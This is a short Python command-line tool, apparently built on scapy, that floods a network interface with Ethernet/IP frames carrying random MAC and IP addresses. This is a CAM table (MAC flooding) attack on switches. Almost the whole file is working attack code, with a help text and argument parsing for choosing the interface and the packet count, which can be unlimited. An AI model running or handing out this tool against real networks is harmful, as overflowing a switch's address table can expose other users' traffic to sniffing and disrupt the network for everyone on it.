help = """
	It is very easy to use this tool!!
	You only need to specifay the interface
	and the number of packets that you need to send!
_______________________________________________________________
	Requered:!!
	-i, --iface: The interface that will be used to send the packets.
	-p, --packets: The number of the packets that will be sended.
"""

def cam_flood(packets, iface):
	if packets == 0:
		i = 0
		while True:
			try:
				packet = Ether(src=RandMAC(), dst=RandMAC())/IP(src=RandIP(), dst=RandIP())
				sendp(packet, iface=iface)
				i+=1
			except KeyboardInterrupt:
				print(f"\nThe tool stopped at packet {i}!")
				break
	else:
		for i in range(0, packets):
			try:
				packet = Ether(src=RandMAC(), dst=RandMAC())/IP(src=RandIP(), dst=RandIP())
				sendp(packet, iface=iface)
			except KeyboardInterrupt:
				print(f"\nThe tool stopped at packet {i}!")
				break
			



def bring_iface():
	iface = ""
	try:
		iface = sys.argv[sys.argv.index("-i") + 1]
	except:
		try:
			iface = sys.argv[sys.argv.index("--iface") + 1]
		except:
			iface = False
	
	return iface
	
	
def bring_packets():
	packets = 0
	
	try:
		packets = int(sys.argv[sys.argv.index("-p") + 1])
	except:
		try:
			packets = int(sys.argv[sys.argv.index("--packets") + 1])
		except:
			packets = False
	
	return packets
			

if __name__ == "__main__":
	if "-h" in sys.argv or "--help" in sys.argv:
		print(help)
	elif ("-i" in sys.argv or "--iface" in sys.argv) and ("-p" in sys.argv or "--packets" in sys.argv):
		print(logo)
		iface = bring_iface()
		packets = bring_packets()
		if iface == False or (packets == False and packets != 0):
			print("Error! Wrong values!!")
		else:
			cam_flood(packets, iface)
			print("Packets was sended successfuly!!")
	else:
		print("Please type -h or --help to see the requered arguments!")
			


	
	
	
